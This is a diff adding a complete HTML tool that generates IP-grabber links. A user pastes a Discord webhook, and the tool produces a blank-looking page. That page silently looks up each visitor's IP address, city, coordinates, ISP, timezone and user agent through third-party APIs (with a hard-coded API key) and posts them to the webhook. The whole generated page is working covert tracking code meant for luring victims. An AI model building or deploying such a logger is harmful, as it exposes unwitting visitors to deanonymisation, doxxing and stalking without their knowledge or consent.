@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>·</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    background: #000000;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Inter', 'Segoe UI', sans-serif;
+    overflow: hidden;
+    position: relative;
+  }
+
+  #particleCanvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  .card {
+    position: relative;
+    z-index: 10;
+    background: #000000;
+    border: 1px solid rgba(255, 255, 255, 0.05);
+    padding: 48px 40px;
+    max-width: 420px;
+    width: 92%;
+  }
+
+  .input-wrapper {
+    position: relative;
+    margin-bottom: 20px;
+  }
+
+  .input-wrapper input {
+    width: 100%;
+    padding: 18px 20px;
+    background: #000000;
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    color: rgba(255, 255, 255, 0.7);
+    font-size: 0.85rem;
+    font-family: 'Inter', sans-serif;
+    font-weight: 300;
+    outline: none;
+    transition: 0.2s ease;
+    letter-spacing: 0.5px;
+  }
+
+  .input-wrapper input:focus {
+    border-color: rgba(255, 255, 255, 0.15);
+    background: #000000;
+  }
+
+  .input-wrapper input::placeholder {
+    color: rgba(255, 255, 255, 0.08);
+    font-weight: 300;
+    letter-spacing: 1px;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 18px;
+    background: #000000;
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    color: rgba(255, 255, 255, 0.3);
+    font-size: 0.7rem;
+    font-weight: 300;
+    font-family: 'Inter', sans-serif;
+    letter-spacing: 4px;
+    cursor: pointer;
+    transition: 0.2s ease;
+    text-transform: uppercase;
+  }
+
+  .btn:hover {
+    background: #0a0a0a;
+    border-color: rgba(255, 255, 255, 0.12);
+    color: rgba(255, 255, 255, 0.5);
+  }
+
+  .btn:active {
+    transform: scale(0.98);
+  }
+
+  .output-box {
+    margin-top: 20px;
+    background: #000000;
+    border: 1px solid rgba(255, 255, 255, 0.02);
+    padding: 16px 20px;
+    min-height: 56px;
+    display: flex;
+    align-items: center;
+  }
+
+  .output-box .placeholder {
+    color: rgba(255, 255, 255, 0.04);
+    font-size: 0.65rem;
+    font-weight: 300;
+    letter-spacing: 2px;
+  }
+
+  .output-box .link-wrapper {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+    width: 100%;
+  }
+
+  .output-box a {
+    color: rgba(255, 255, 255, 0.25);
+    text-decoration: none;
+    font-weight: 300;
+    font-size: 0.7rem;
+    word-break: break-all;
+    transition: 0.2s;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+    padding-bottom: 2px;
+  }
+
+  .output-box a:hover {
+    color: rgba(255, 255, 255, 0.4);
+    border-bottom-color: rgba(255, 255, 255, 0.08);
+  }
+
+  .copy-badge {
+    font-size: 0.5rem;
+    background: #000000;
+    padding: 4px 12px;
+    color: rgba(255, 255, 255, 0.06);
+    letter-spacing: 2px;
+    border: 1px solid rgba(255, 255, 255, 0.02);
+    cursor: pointer;
+    transition: 0.2s;
+    white-space: nowrap;
+    text-transform: uppercase;
+  }
+
+  .copy-badge:hover {
+    border-color: rgba(255, 255, 255, 0.06);
+    color: rgba(255, 255, 255, 0.12);
+  }
+
+  .divider {
+    width: 100%;
+    height: 1px;
+    background: rgba(255, 255, 255, 0.02);
+    margin: 16px 0;
+  }
+
+  .status-msg {
+    font-size: 0.5rem;
+    margin-top: 12px;
+    text-align: center;
+    color: rgba(255, 255, 255, 0.02);
+    letter-spacing: 3px;
+    font-weight: 300;
+  }
+
+  .status-msg.error {
+    color: rgba(255, 255, 255, 0.05);
+  }
+
+  .status-msg.success {
+    color: rgba(255, 255, 255, 0.05);
+  }
+
+  @keyframes fadeSlide {
+    0% { opacity: 0; transform: translateY(4px); }
+    100% { opacity: 1; transform: translateY(0); }
+  }
+
+  .fade-in {
+    animation: fadeSlide 0.3s ease forwards;
+  }
+</style>
+</head>
+<body>
+
+<canvas id="particleCanvas"></canvas>
+
+<div class="card">
+  <div class="input-wrapper">
+    <input type="url" id="webhookInput" placeholder="webhook url" spellcheck="false">
+  </div>
+
+  <button class="btn" id="generateBtn">generate</button>
+
+  <div class="divider"></div>
+
+  <div class="output-box" id="outputBox">
+    <span class="placeholder">link</span>
+  </div>
+
+  <div class="status-msg" id="statusMsg">·</div>
+</div>
+
+<script>
+  // ============================
+  //  BLACK & WHITE PARTICLES
+  // ============================
+  const canvas = document.getElementById('particleCanvas');
+  const ctx = canvas.getContext('2d');
+  let w, h;
+
+  function resizeCanvas() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+  }
+  resizeCanvas();
+  window.addEventListener('resize', resizeCanvas);
+
+  const particles = [];
+  const PARTICLE_COUNT = 50;
+
+  for (let i = 0; i < PARTICLE_COUNT; i++) {
+    particles.push({
+      x: Math.random() * w,
+      y: Math.random() * h,
+      radius: 0.3 + Math.random() * 1.2,
+      speedX: (Math.random() - 0.5) * 0.1,
+      speedY: (Math.random() - 0.5) * 0.1 - 0.03,
+      opacity: 0.01 + Math.random() * 0.06,
+      pulse: Math.random() * Math.PI * 2,
+      pulseSpeed: 0.003 + Math.random() * 0.008
+    });
+  }
+
+  let mouseX = w/2, mouseY = h/2;
+  let mouseInfluence = 0;
+
+  document.addEventListener('mousemove', (e) => {
+    mouseX = e.clientX;
+    mouseY = e.clientY;
+    mouseInfluence = 1;
+  });
+
+  document.addEventListener('mouseleave', () => {
+    mouseInfluence = 0;
+  });
+
+  function drawParticles() {
+    ctx.clearRect(0, 0, w, h);
+
+    for (let p of particles) {
+      const dx = mouseX - p.x;
+      const dy = mouseY - p.y;
+      const dist = Math.sqrt(dx*dx + dy*dy);
+      if (dist < 200 && mouseInfluence > 0) {
+        const force = (1 - dist/200) * 0.3 * mouseInfluence;
+        p.x += dx * force * 0.02;
+        p.y += dy * force * 0.02;
+      }
+
+      p.x += p.speedX;
+      p.y += p.speedY;
+
+      if (p.x < -10) p.x = w + 10;
+      if (p.x > w + 10) p.x = -10;
+      if (p.y < -10) p.y = h + 10;
+      if (p.y > h + 10) p.y = -10;
+
+      p.pulse += p.pulseSpeed;
+      const pulseFactor = 0.7 + 0.3 * Math.sin(p.pulse);
+      const radius = p.radius * pulseFactor;
+      const alpha = p.opacity * (0.6 + 0.4 * Math.sin(p.pulse * 0.7));
+
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, radius, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(255, 255, 255, ${alpha * 0.3})`;
+      ctx.fill();
+    }
+
+    requestAnimationFrame(drawParticles);
+  }
+  drawParticles();
+
+  // ============================
+  //  WEBHOOK + IP LOGIC
+  // ============================
+  const webhookInput = document.getElementById('webhookInput');
+  const generateBtn = document.getElementById('generateBtn');
+  const outputBox = document.getElementById('outputBox');
+  const statusMsg = document.getElementById('statusMsg');
+
+  const API_KEY = '60168b4930ba41ee82b0d3a2b09ea38c';
+
+  function setStatus(msg, type = '') {
+    statusMsg.textContent = msg;
+    statusMsg.className = 'status-msg ' + type;
+  }
+
+  generateBtn.addEventListener('click', function() {
+    let webhookUrl = webhookInput.value.trim();
+    if (!webhookUrl) {
+      setStatus('error', 'error');
+      outputBox.innerHTML = `<span class="placeholder" style="color:rgba(255,255,255,0.03);">webhook required</span>`;
+      return;
+    }
+
+    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+      setStatus('error', 'error');
+      outputBox.innerHTML = `<span class="placeholder" style="color:rgba(255,255,255,0.03);">invalid webhook</span>`;
+      return;
+    }
+
+    setStatus('·', '');
+
+    const encodedWebhook = encodeURIComponent(webhookUrl);
+    const uid = Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
+
+    const trackingPage = `<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>·</title>
+<style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:rgba(255,255,255,0.02);font-family:'Inter',sans-serif;overflow:hidden;} .dot{font-size:2rem;letter-spacing:8px;font-weight:300;animation:pulse 4s ease-in-out infinite;} @keyframes pulse{0%{opacity:0.02;}50%{opacity:0.1;}100%{opacity:0.02;}}</style>
+</head>
+<body>
+<div class="dot">·</div>
+<script>
+(async function() {
+  const webhook = decodeURIComponent("${encodedWebhook}");
+  const apiKey = "${API_KEY}";
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    const ip = ipData.ip || 'unknown';
+
+    const geoRes = await fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey + '&ip_address=' + ip);
+    const geo = await geoRes.json();
+
+    const info = {
+      ip: geo.ip || ip,
+      city: geo.city || 'N/A',
+      region: geo.region || 'N/A',
+      country: geo.country || 'N/A',
+      latitude: geo.latitude || 'N/A',
+      longitude: geo.longitude || 'N/A',
+      isp: geo.isp || 'N/A',
+      timezone: geo.timezone?.name || 'N/A',
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    };
+
+    const embed = {
+      title: '·',
+      color: 0x000000,
+      fields: [
+        { name: 'ip', value: info.ip, inline: true },
+        { name: 'city', value: info.city, inline: true },
+        { name: 'region', value: info.region, inline: true },
+        { name: 'country', value: info.country, inline: true },
+        { name: 'lat/lon', value: info.latitude + ', ' + info.longitude, inline: true },
+        { name: 'isp', value: info.isp, inline: true },
+        { name: 'timezone', value: info.timezone, inline: true },
+        { name: 'user-agent', value: info.userAgent, inline: false },
+        { name: 'timestamp', value: info.timestamp, inline: false }
+      ],
+      footer: { text: '·' }
+    };
+
+    await fetch(webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch(e) {}
+
+  document.body.innerHTML = '<div style="background:#000;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center;font-family:Inter,sans-serif;color:rgba(255,255,255,0.01);font-size:3rem;letter-spacing:16px;">·</div>';
+})();
+<\/script>
+</body>
+</html>`;
+
+    const blob = new Blob([trackingPage], { type: 'text/html' });
+    const sublink = URL.createObjectURL(blob);
+
+    outputBox.innerHTML = `
+      <div class="link-wrapper fade-in">
+        <a href="${sublink}" target="_blank" id="trackLink">${sublink}</a>
+        <span class="copy-badge" id="copyBtn">copy</span>
+      </div>
+    `;
+
+    document.getElementById('copyBtn').addEventListener('click', function() {
+      const link = document.getElementById('trackLink').href;
+      navigator.clipboard?.writeText(link).then(() => {
+        setStatus('copied', 'success');
+      }).catch(() => {
+        const range = document.createRange();
+        range.selectNode(document.getElementById('trackLink'));
+        window.getSelection().removeAllRanges();
+        window.getSelection().addRange(range);
+        document.execCommand('copy');
+        setStatus('copied', 'success');
+      });
+    });
+
+    setStatus('generated', 'success');
+  });
+
+  webhookInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') generateBtn.click();
+  });
+
+  webhookInput.focus();
+</script>
+</body>
+</html>
